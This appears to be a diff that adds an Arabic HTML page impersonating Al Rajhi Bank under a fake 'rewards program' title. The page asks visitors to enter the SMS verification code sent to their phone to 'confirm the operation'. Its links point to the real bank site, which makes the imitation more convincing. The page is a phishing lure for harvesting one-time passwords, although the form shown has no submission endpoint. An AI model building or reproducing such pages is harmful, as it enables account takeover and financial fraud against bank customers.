@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="img/favicon-32x32.png" rel="shortcut icon" />
+    <title>اهلا بك في برنامج مكافاة | مصرف الراجحي</title>
+    <style>
+        @font-face {
+font-family: 'ArabicKufi';
+src: url('path/to/arabic-kufi-font.woff2') format('woff2'),
+url('path/to/arabic-kufi-font.woff') format('woff');
+}
+        /* الأيقونات */
+        .fas {
+            margin-right: 5px;
+        }
+
+        /* باقي الأنماط الأصلية */
+        body {
+            font-family: 'ArabicKufi', Arial, sans-serif;
+           
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+          direction: rtl;
+          position: sticky;
+
+    top: 0;
+    background-color: #2225d1;
+    color: #fff;
+    height: 130px;
+    display: flex;
+    align-items: center;
+    padding: 0 20px;
+        }
+
+        .logo {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+        
+        }
+    
+        .logo img {
+            width: 60px;
+            height : 60px;
+            margin-right: 20px;
+        }
+
+        header .logo1 {
+            margin: 0 auto;
+            display: flex;
+        }
+
+        header .logo1 img {
+            width: 60px;
+            height: 60px;
+            margin-left:50px;
+        }
+
+        .login-button {
+            margin-left: 20px;
+        }
+
+        .login-button a {
+            border: none;
+            background-color: rgb(34, 165, 252); /* تعيين لون الباكغراوند مع شفافية هنا */
+           
+            color: rgb(251, 250, 252);
+            padding: 30px 50px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 25px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+            border-radius: 100px; /* تعديل تفاف زوايا الباك غراوند هنا */
+        }
+
+        .login-button:hover {
+            color: rgb(115, 17, 228); /* تغيير لون كلمة تسجيل الدخول عند وضع المؤشر عليها */
+        }
+
+            
+        .bottom-nav {
+            position: fixed;
+            bottom: 100px;
+            left: 12px;
+            width: 94%;
+            height: 127px; /* تعديل ارتفاع اللباكغراوند هنا */
+            background-color: rgba(34, 165, 252, 0.9); /* تعيين لون الباكغراوند مع شفافية هنا */
+            color: #fff;
+            padding: 10px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            border-radius: 100px; /* تعديل تفاف زوايا الباك غراوند هنا */
+            
+        }
+
+        .bottom-nav ul {
+            display: flex;
+            justify-content: center;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .bottom-nav li {
+            margin: 0 25px;
+        }
+
+        .bottom-nav a {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            color: #fff;
+            text-decoration: none;
+            font-size: 45px;
+        }
+        
+        
+        .bottom-nav a:hover {
+            color: #413f3f;
+        } 
+        
+        
+
+
+        .container {
+          
+  
+  margin-left: 350px;
+  text-align: center;
+  background-color: #fff;
+  padding: 20px;
+  width: 50%;
+  transform: scale(1.2);
+  border: 1px indigo #000;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(187, 184, 184, 0.2);
+}
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 20px;
+    }
+
+    label {
+        font-weight: bold;
+      font-size: 40px;
+      margin-bottom: 10px;
+      color: #2225d1;
+    }
+
+    input {
+      padding: 10px;
+      font-size: 32px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      width: 250px;
+      margin-bottom: 10px;
+    }
+
+    button {
+      padding: 15px 40px;
+      font-size: 24px;
+      background-color: #2225d1;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #8653fd;
+    }
+
+    .message {
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .instructions {
+        color: #333;
+        direction: rtl;
+    text-align: center;
+      margin-top: 20px;
+    }
+
+    .instructions ul {
+      
+      list-style-type: disc;
+      margin-left: 20px;
+      text-align:right;
+    }
+
+    .instructions li {
+      text-align:right;
+      margin-bottom: 10px;
+      
+
+    }
+    .text{
+        font-size: 24px;
+    }
+    .hr{
+        
+        width: 30%;
+    }
+
+
+
+    @keyframes fadeOut {
+    0% {
+        opacity: 1;
+    }
+    50% {
+        opacity: 0;
+    }
+    100% {
+        opacity: 1;
+        display: none;
+    }
+}
+
+.logo6 {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    animation: fadeIn 1s forwards;
+}
+
+.content {
+    visibility: hidden;
+}
+
+@keyframes fadeIn {
+    0% {
+        opacity: 0;
+    }
+    100% {
+        opacity: 1;
+    }
+
+    </style>
+    </head>
+<body>
+  <div class="logo6">
+    <img src="img/lllo.png" alt="اسم اللوغو">
+</div>
+
+<div class="content">
+    <!-- محتوى الصفحة هنا -->
+
+
+
+
+
+
+
+    <header>
+        <div class="logo">
+            <img src="img/mff.png" alt="لوغو">
+        </div>
+
+        <div class="logo1">
+            <img src="img/logo-arb.png" alt="لوغو ثاني" >
+        </div>
+
+        
+        <div class="login-button">
+            <a href="https://onlinebanking.alrajhibank.com.sa/OnlineBanking/">تسجيل الدخول</a>
+        </div>
+    </header>
+   
+
+    .<br>.<br>.<br>
+    <div class="container">
+        <form onsubmit="return validateForm(event)">
+            <label for="verification-code">تأكيد العملية </label>
+    <p class="text">ادخل رمز التحقق الذي تم ارساله الى رقمك ********05 لتأكيد العملية </p>
+            <input type="text" id="verification-code" name="verification-code" oninput="validateCode(this)" pattern="[0-9]{6}" required>
+            <button type="submit" id="submit-button" disabled>تحقق</button>
+            
+        </form>
+        <br>
+    <hr>
+    <script>
+        function validateCode(input) {
+            // التحقق من أن القيمة المدخلة هي أرقام فقط
+            input.value = input.value.replace(/[^0-9]/g, '');
+    
+            // التحقق من أن القيمة المدخلة لا تزيد ولا تنقص عن 6 أرقام
+            if (input.value.length > 6) {
+                input.value = input.value.slice(0, 6);
+            }
+    
+            // تمكين زر التأكيد إذا كانت القيمة المدخلة تحتوي على 6 أرقام
+            const submitButton = document.getElementById('submit-button');
+            submitButton.disabled = input.value.length !== 6;
+    
+            // إخفاء رسالة الخطأ إذا تم تصحيح الإدخال
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.style.display = 'none';
+        }
+    
+        function validateForm(event) {
+            const input = document.getElementById('verification-code');
+            const errorMessage = document.getElementById('error-message');
+            const successMessage = document.getElementById('success-message');
+    
+            // التحقق من أن القيمة المدخلة تحتوي على 6 أرقام قبل إرسال النموذج
+            if (input.value.length !== 6) {
+                errorMessage.textContent = 'تأكد من صحة الرمز';
+                errorMessage.style.display = 'block';
+                event.preventDefault(); // منع إرسال النموذج
+                return false;
+            }
+    
+            successMessage.textContent = 'تم تأكيد الرمز بنجاح';
+            successMessage.style.display = 'block';
+            return true;
+        }
+    </script>
+        
+        <div class="instructions" >
+          
+          <ul>
+            <li class="text"> أدخل رمز التحقق الذي تلقيته عبر الرسائل النصية "sms"  .</li>
+            <li class="text">تأكد من كتابة الرمز بشكل صحيح وبدون أي أخطاء.</li>
+            <li class="text">اضغط على زر "تأكيد" بعد كتابة الرمز.</li>
+            <li class="text">إذا كان الرمز صحيحًا، سيتم تأكيد العملية.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    </div>
+
+
+
+
+<div  class="bottom-nav">
+        <ul>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Accounts"><i class="fas fa-user"></i> <span>الحسابات</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Cards"><i class="fas fa-credit-card"></i> <span>البطاقات</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Finance"><i class="fas fa-money-bill"></i> <span>التمويل</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Insurance"><i class="fas fa-shield-alt"></i> <span>التأمين</span></a></li>
+        </ul>
+        </div>
+   
+</div>
+</div>
+<script>
+    const logoElement = document.querySelector('.logo6');
+    const contentElement = document.querySelector('.content');
+
+    setTimeout(function() {
+        logoElement.style.animation = 'fadeOut 1s forwards';
+        setTimeout(function() {
+            logoElement.style.display = 'none';
+            contentElement.style.visibility = 'visible';
+        }, 1000); // انتظر لمدة ثانية بعد الانتهاء من الوميض قبل إظهار محتوى الصفحة
+    }, 4000);
+
+</script>
+
+    </body>
+</html>
